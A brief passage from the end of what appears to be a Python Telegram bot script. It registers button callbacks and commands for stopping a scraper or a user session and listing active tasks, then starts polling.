    app.add_handler(CallbackQueryHandler(stop_cb, pattern="^STOP:"))
    app.add_handler(CallbackQueryHandler(stop_scraper_cb, pattern="^STOP_SCR:"))
    app.add_handler(CallbackQueryHandler(pref_approved_cb, pattern="^PREF_APPROVED:"))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("stopuser", cmd_stop_user))
    app.add_handler(CommandHandler("active", cmd_active))

    app.run_polling()

if __name__ == "__main__":
    main()